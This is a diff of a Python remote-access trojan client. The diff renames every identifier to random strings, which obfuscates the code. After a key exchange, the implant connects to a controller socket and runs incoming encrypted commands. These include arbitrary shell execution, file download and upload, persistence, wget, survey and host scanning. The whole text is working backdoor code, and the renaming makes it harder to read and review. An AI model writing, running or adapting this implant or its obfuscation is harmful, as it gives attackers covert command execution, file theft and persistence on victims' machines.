@@ -5,60 +5,60 @@ import subprocess
 import struct
 import sys
 try:
-    from core.crypto import AES_decrypt, AES_encrypt, diffiehellman
-    from core.filesock import recvfile, sendfile
-    from core.persistence import run
-    from core.scan import single_host
-    from core.survey import run
-    from core.toolkit import wget, unzip
-except ImportError as e:
-    print(e)
+    from core.crypto import vTYSKuIhNxlSaaGMqczXnvvdSEyfcCaz, jPZzsDfeiZRgNjrNBIlaUBIRWcGSUACw, uwOextuKbEVHwkbZiYiWAZaRnSRCOKoA
+    from core.filesock import yjQlCEghfMxsJwdmoDLBqnesZhMFoTtH, LsEvOAVQPRUrrNvbBUQcKlyeWdlSoWyi
+    from core.persistence import KkcYsizBHBQwCUpnRgwrYYAAnXOReEQQ
+    from core.scan import rIWDlLvwQJNduZJsdPwSVIUMRBxTNank
+    from core.survey import KkcYsizBHBQwCUpnRgwrYYAAnXOReEQQ
+    from core.toolkit import IqKsJvdgDmUmoQnjYBwqdobWQbQIsuSB, YqJAJWVCKIQnzKVFYIFbwvGyLEHkdSzJ
+except ImportError as avNHPTznqFYhEoRsxGTYMYACxLmbcQJs:
+    print(avNHPTznqFYhEoRsxGTYMYACxLmbcQJs)
     sys.exit(0)
-PLAT_TYPE = sys.platform
-HOST      = 'localhost'
-PORT      = 1337
-FB_KEY    = 'b14ce95fa4c33ac2803782d18341869f'
-def main():
-    s = socket.socket()
-    s.connect((HOST, PORT))
-    DHKEY = diffiehellman(s)
+NMcHFwTpAqqciBcKkKPwuqPDnPVvnpiz = sys.platform
+eaihQtAyilmwgjbIDCJGOBbdEhCsdgFO      = 'localhost'
+PYlozZmwOuTweSCzfSxjoLsvKsfUtgWj      = 1337
+EakFFYQngODCjVemerDhJGXIsiLIuWyb    = 'b14ce95fa4c33ac2803782d18341869f'
+def IdarYTtwTCMUuBxkRmpKcsCdGsSVgaFX():
+    GmwXZdrnoUbldKqssCIqWIqANfnQaEIj = socket.socket()
+    GmwXZdrnoUbldKqssCIqWIqANfnQaEIj.connect((eaihQtAyilmwgjbIDCJGOBbdEhCsdgFO, PYlozZmwOuTweSCzfSxjoLsvKsfUtgWj))
+    mOwFAIMjnvpITALRtKohzxocgBwtHBNM = uwOextuKbEVHwkbZiYiWAZaRnSRCOKoA(GmwXZdrnoUbldKqssCIqWIqANfnQaEIj)
     while True:
-        data = s.recv(1024)
-        data = AES_decrypt(data, DHKEY)
-        cmd, _, action = data.partition(' ')
-        if cmd == 'quit':
-            s.close()
+        GkhcTLcKpgtGdZnRyrrRGfRUdvxHZutH = GmwXZdrnoUbldKqssCIqWIqANfnQaEIj.recv(1024)
+        GkhcTLcKpgtGdZnRyrrRGfRUdvxHZutH = vTYSKuIhNxlSaaGMqczXnvvdSEyfcCaz(GkhcTLcKpgtGdZnRyrrRGfRUdvxHZutH, mOwFAIMjnvpITALRtKohzxocgBwtHBNM)
+        wERuTKBOCPCahvPuqrVtuEthDpuhYngL, _, action = GkhcTLcKpgtGdZnRyrrRGfRUdvxHZutH.partition(' ')
+        if wERuTKBOCPCahvPuqrVtuEthDpuhYngL == 'quit':
+            GmwXZdrnoUbldKqssCIqWIqANfnQaEIj.close()
             sys.exit(0)
-        elif cmd == 'run':
-            results = subprocess.Popen(action, shell=True,
+        elif wERuTKBOCPCahvPuqrVtuEthDpuhYngL == 'run':
+            gJOTYGTIGJHruoBpOejTvOJsMiZzYjrm = subprocess.Popen(action, shell=True,
                       stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                       stdin=subprocess.PIPE)
-            results = results.stdout.read() + results.stderr.read()
-            s.sendall(AES_encrypt(results, DHKEY))
-        elif cmd == 'download':
-            for fname in action.split():
-                fname = fname.strip()
-                sendfile(s, fname, DHKEY)
-        elif cmd == 'upload':
-            for fname in action.split():
-                fname = fname.strip()
-                recvfile(s, fname, DHKEY)
-        elif cmd == 'rekey':
-            DHKEY = diffiehellman(s)
-        elif cmd == 'persistence':
-            results = run(PLAT_TYPE)
-            s.send(AES_encrypt(results, DHKEY))
-        elif cmd == 'wget':
-            results = wget(action)
-            s.send(AES_encrypt(results, DHKEY))
-        elif cmd == 'unzip':
-            results = unzip(action)
-            s.send(AES_encrypt(results, DHKEY))
-        elif cmd == 'survey':
-            results = run(PLAT_TYPE)
-            s.send(AES_encrypt(results, DHKEY))
-        elif cmd == 'scan':
-            results = single_host(action)
-            s.send(AES_encrypt(results, DHKEY))
+            gJOTYGTIGJHruoBpOejTvOJsMiZzYjrm = gJOTYGTIGJHruoBpOejTvOJsMiZzYjrm.stdout.read() + gJOTYGTIGJHruoBpOejTvOJsMiZzYjrm.stderr.read()
+            GmwXZdrnoUbldKqssCIqWIqANfnQaEIj.sendall(jPZzsDfeiZRgNjrNBIlaUBIRWcGSUACw(gJOTYGTIGJHruoBpOejTvOJsMiZzYjrm, mOwFAIMjnvpITALRtKohzxocgBwtHBNM))
+        elif wERuTKBOCPCahvPuqrVtuEthDpuhYngL == 'download':
+            for FncUDhpNFnbFvciPnXtmEumcvADoZbpd in action.split():
+                FncUDhpNFnbFvciPnXtmEumcvADoZbpd = FncUDhpNFnbFvciPnXtmEumcvADoZbpd.strip()
+                LsEvOAVQPRUrrNvbBUQcKlyeWdlSoWyi(GmwXZdrnoUbldKqssCIqWIqANfnQaEIj, FncUDhpNFnbFvciPnXtmEumcvADoZbpd, mOwFAIMjnvpITALRtKohzxocgBwtHBNM)
+        elif wERuTKBOCPCahvPuqrVtuEthDpuhYngL == 'upload':
+            for FncUDhpNFnbFvciPnXtmEumcvADoZbpd in action.split():
+                FncUDhpNFnbFvciPnXtmEumcvADoZbpd = FncUDhpNFnbFvciPnXtmEumcvADoZbpd.strip()
+                yjQlCEghfMxsJwdmoDLBqnesZhMFoTtH(GmwXZdrnoUbldKqssCIqWIqANfnQaEIj, FncUDhpNFnbFvciPnXtmEumcvADoZbpd, mOwFAIMjnvpITALRtKohzxocgBwtHBNM)
+        elif wERuTKBOCPCahvPuqrVtuEthDpuhYngL == 'rekey':
+            mOwFAIMjnvpITALRtKohzxocgBwtHBNM = uwOextuKbEVHwkbZiYiWAZaRnSRCOKoA(GmwXZdrnoUbldKqssCIqWIqANfnQaEIj)
+        elif wERuTKBOCPCahvPuqrVtuEthDpuhYngL == 'persistence':
+            gJOTYGTIGJHruoBpOejTvOJsMiZzYjrm = KkcYsizBHBQwCUpnRgwrYYAAnXOReEQQ(NMcHFwTpAqqciBcKkKPwuqPDnPVvnpiz)
+            GmwXZdrnoUbldKqssCIqWIqANfnQaEIj.send(jPZzsDfeiZRgNjrNBIlaUBIRWcGSUACw(gJOTYGTIGJHruoBpOejTvOJsMiZzYjrm, mOwFAIMjnvpITALRtKohzxocgBwtHBNM))
+        elif wERuTKBOCPCahvPuqrVtuEthDpuhYngL == 'wget':
+            gJOTYGTIGJHruoBpOejTvOJsMiZzYjrm = IqKsJvdgDmUmoQnjYBwqdobWQbQIsuSB(action)
+            GmwXZdrnoUbldKqssCIqWIqANfnQaEIj.send(jPZzsDfeiZRgNjrNBIlaUBIRWcGSUACw(gJOTYGTIGJHruoBpOejTvOJsMiZzYjrm, mOwFAIMjnvpITALRtKohzxocgBwtHBNM))
+        elif wERuTKBOCPCahvPuqrVtuEthDpuhYngL == 'unzip':
+            gJOTYGTIGJHruoBpOejTvOJsMiZzYjrm = YqJAJWVCKIQnzKVFYIFbwvGyLEHkdSzJ(action)
+            GmwXZdrnoUbldKqssCIqWIqANfnQaEIj.send(jPZzsDfeiZRgNjrNBIlaUBIRWcGSUACw(gJOTYGTIGJHruoBpOejTvOJsMiZzYjrm, mOwFAIMjnvpITALRtKohzxocgBwtHBNM))
+        elif wERuTKBOCPCahvPuqrVtuEthDpuhYngL == 'survey':
+            gJOTYGTIGJHruoBpOejTvOJsMiZzYjrm = KkcYsizBHBQwCUpnRgwrYYAAnXOReEQQ(NMcHFwTpAqqciBcKkKPwuqPDnPVvnpiz)
+            GmwXZdrnoUbldKqssCIqWIqANfnQaEIj.send(jPZzsDfeiZRgNjrNBIlaUBIRWcGSUACw(gJOTYGTIGJHruoBpOejTvOJsMiZzYjrm, mOwFAIMjnvpITALRtKohzxocgBwtHBNM))
+        elif wERuTKBOCPCahvPuqrVtuEthDpuhYngL == 'scan':
+            gJOTYGTIGJHruoBpOejTvOJsMiZzYjrm = rIWDlLvwQJNduZJsdPwSVIUMRBxTNank(action)
+            GmwXZdrnoUbldKqssCIqWIqANfnQaEIj.send(jPZzsDfeiZRgNjrNBIlaUBIRWcGSUACw(gJOTYGTIGJHruoBpOejTvOJsMiZzYjrm, mOwFAIMjnvpITALRtKohzxocgBwtHBNM))
 if __name__ == '__main__':
-    main()
+    IdarYTtwTCMUuBxkRmpKcsCdGsSVgaFX()
